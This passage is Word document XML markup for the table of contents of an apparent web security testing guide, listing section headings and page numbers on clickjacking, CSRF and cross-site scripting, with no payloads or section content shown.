        <w:p w14:paraId="63522A25" w14:textId="6B0A3FFA" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408598" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>What is Clickjacking?</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408598 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>36</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6227A93A" w14:textId="12629A8E" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408599" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Threat Model</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408599 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>36</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="26940378" w14:textId="25FF625F" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408600" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>How to Test (Step by step)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408600 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>36</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1755CD91" w14:textId="77A0438A" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408601" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Defensive Mitigations</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408601 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>37</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="51BBE547" w14:textId="2D597553" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408602" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Cross Site Request Forgery</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408602 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>37</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3057B813" w14:textId="22E245F6" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408603" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>What is CSRF?</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408603 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>37</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="303D7E3B" w14:textId="44893D3C" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408604" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Threat Model</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408604 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>37</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4220624B" w14:textId="537DADC2" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408605" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Testing for CSRF</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408605 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>38</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6F67AE4F" w14:textId="1DB88F78" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408606" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Example PoC Payloads</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408606 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>38</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="77970F72" w14:textId="4CC131AA" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408607" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Defensive Mitigations</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408607 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>38</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="79388744" w14:textId="1F82D99F" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408608" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Cross-Site Scripting (XSS)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408608 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>39</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="08AA297A" w14:textId="26869198" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408609" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Definition &amp; Why It Exists</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408609 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>39</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0305E4D9" w14:textId="08286C4C" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408610" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.2 Threat Model &amp; Impact</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408610 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>39</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="1428FCCD" w14:textId="5B56F1C8" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408611" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Step-by-Step Identification</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408611 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>39</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0376FF26" w14:textId="0CCAC8A3" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408612" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Example Payloads</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408612 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>39</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0727018A" w14:textId="749630B6" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408613" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Advanced Payload Tricks &amp; Bypass Techniques</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc208408613 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>40</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7E72CF77" w14:textId="2A86670F" w:rsidR="00F93AFC" w:rsidRDefault="00F93AFC">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="8630"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:val="en-IN"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc208408614" w:history="1">
            <w:r w:rsidRPr="00CD7935">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Mitigations</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
